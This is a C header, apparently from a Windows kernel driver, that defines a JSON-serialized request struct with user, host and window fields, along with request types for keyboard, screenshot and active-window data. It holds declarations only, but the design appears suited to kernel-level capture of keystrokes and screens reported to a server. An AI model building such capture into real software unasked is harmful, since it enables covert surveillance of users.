#pragma once
#include <inc/drvmain.h>
#include <inc/json.h>

typedef struct _SREQUEST {
	JSON_MAP map;
	LIST_ENTRY ListEntry;
	int type;
	int status;
	int pid;
	int tid;
	int sessionId;
	char *hostId;
	char *clientId;
	char *authId;
	char *userSid;
	char *userName;
	char *programName;
	char *windowTitle;
	char *systemTime;
	char *data;
	size_t dataSz;
} SREQUEST, *PSREQUEST;

PSREQUEST SRequestCreate(int type);
PSREQUEST SRequestCreateData(int type, size_t dataSz);
PSREQUEST SRequestParse(char *json);
char *SRequestDumps(PSREQUEST request); 
void SRequestDelete(PSREQUEST request);

#define SREQ_TYPE_BASE					0x900
#define SREQ_TYPE_UNDEFINED				(SREQ_TYPE_BASE + 1)
#define SREQ_TYPE_ECHO					(SREQ_TYPE_BASE + 2)
#define SREQ_TYPE_KEYBRD				(SREQ_TYPE_BASE + 3)
#define SREQ_TYPE_SCREENSHOT			(SREQ_TYPE_BASE + 4)
#define SREQ_TYPE_USER_WINDOW			(SREQ_TYPE_BASE + 5)

#define SREQ_SUCCESS					0x0
#define SREQ_ERROR						0xD0000000
#define SREQ_ERROR_UNDEFINED			(SREQ_ERROR+1)
#define SREQ_ERROR_NOT_SUPPORTED		(SREQ_ERROR+2)
#define SREQ_ERROR_JSON_DECODE			(SREQ_ERROR+3)
#define SREQ_ERROR_NO_MEM				(SREQ_ERROR+4)
#define SREQ_ERROR_NO_RESPONSE			(SREQ_ERROR+5)
#define SREQ_ERROR_SERVER_ERROR			(SREQ_ERROR+6)
#define SREQ_ERROR_AUTH_ERROR			(SREQ_ERROR+7)
#define SREQ_ERROR_ACCESS_DENIED		(SREQ_ERROR+8)

#define SREQ_MAX_DATA_SZ				(256*PAGE_SIZE)